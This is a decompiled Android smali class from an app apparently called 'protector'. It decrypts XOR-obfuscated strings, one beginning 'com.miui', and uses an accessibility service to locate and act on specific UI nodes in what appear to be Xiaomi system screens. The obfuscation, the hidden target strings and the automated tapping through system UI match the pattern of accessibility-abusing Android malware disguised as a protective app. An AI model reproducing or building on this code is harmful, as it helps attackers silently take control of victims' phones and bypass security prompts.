.class Lcom/icontrol/protector/m$f;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/m;->L1(I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    sget-object v0, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;

    const/16 v1, 0x28

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    const/4 v3, 0x0

    move v4, v3

    :goto_0
    if-ge v3, v1, :cond_1

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_0

    const/16 v6, 0x26

    new-array v6, v6, [B

    fill-array-data v6, :array_2

    new-array v7, v2, [B

    fill-array-data v7, :array_3

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    invoke-interface {v6}, Ljava/util/Collection;->stream()Ljava/util/stream/Stream;

    move-result-object v6

    invoke-interface {v6}, Ljava/util/stream/Stream;->findFirst()Ljava/util/Optional;

    move-result-object v6

    const/4 v7, 0x0

    invoke-virtual {v6, v7}, Ljava/util/Optional;->orElse(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v6, :cond_0

    add-int/lit8 v4, v4, 0x1

    if-ne v4, v2, :cond_0

    invoke-static {v5}, Lcom/icontrol/protector/m;->l0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/icontrol/protector/m$f$a;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/m$f$a;-><init>(Lcom/icontrol/protector/m$f;)V

    const-wide/16 v2, 0x12c

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_1

    :cond_0
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_1
    :goto_1
    return-void

    :array_0
    .array-data 1
        -0x23t
        -0x7bt
        0x18t
        -0x3ct
        -0x43t
        0x67t
        0x3at
        -0x2t
        -0x70t
        -0x67t
        0x10t
        -0x77t
        -0x5bt
        0x7ct
        0x26t
        -0x1dt
        -0x39t
        -0x77t
        0x10t
        -0x7ct
        -0x5ct
        0x6bt
        0x3dt
        -0x53t
        -0x29t
        -0x72t
        0x5at
        -0x68t
        -0x4bt
        0x6dt
        0x36t
        -0xct
        -0x2et
        -0x71t
        0x7t
        -0x4bt
        -0x5at
        0x67t
        0x2at
        -0x20t
    .end array-data

    :array_1
    .array-data 1
        -0x42t
        -0x16t
        0x75t
        -0x16t
        -0x30t
        0xet
        0x4ft
        -0x69t
    .end array-data

    :array_2
    .array-data 1
        0x77t
        -0x31t
        -0x9t
        0x1ft
        -0x4at
        0x23t
        -0x3at
        0x2ct
        0x3at
        -0x2dt
        -0x1t
        0x52t
        -0x52t
        0x38t
        -0x26t
        0x31t
        0x6dt
        -0x3dt
        -0x1t
        0x5ft
        -0x51t
        0x2ft
        -0x3ft
        0x7ft
        0x7dt
        -0x3ct
        -0x4bt
        0x50t
        -0x57t
        0x38t
        -0x24t
        0x32t
        0x4bt
        -0x2et
        -0xdt
        0x56t
        -0x4dt
        0x3et
    .end array-data

    nop

    :array_3
    .array-data 1
        0x14t
        -0x60t
        -0x66t
        0x31t
        -0x25t
        0x4at
        -0x4dt
        0x45t
    .end array-data
.end method
